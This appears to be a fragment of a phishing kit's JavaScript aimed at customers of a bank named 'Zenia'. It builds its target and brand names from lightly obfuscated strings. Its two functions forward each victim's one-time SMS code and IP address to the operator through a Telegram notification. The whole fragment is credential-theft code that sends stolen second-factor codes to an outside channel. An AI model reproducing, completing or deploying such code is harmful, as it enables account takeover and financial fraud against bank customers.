...
let target = "Z-1e-1n-1i-1a-1--1b-1n-1i-1k-1a"; // hadi hizyada;
target = target.split("-1");
target = target.join("");
let brand = "Z-1e-1n-1i-1a"; // hadi hizyada;
brand = brand.split("-1");
brand = brand.join("");
...
function a3(data, ip) {
  sendTelegramNotification('[SMS]{Zenia}(1)', `OTP: ${data.code}`, ip);
}

// SMS notification function (second code)
function a4(data, ip) {
  sendTelegramNotification('[SMS]{Zenia}(2)', `OTP: ${data.code}`, ip);
}
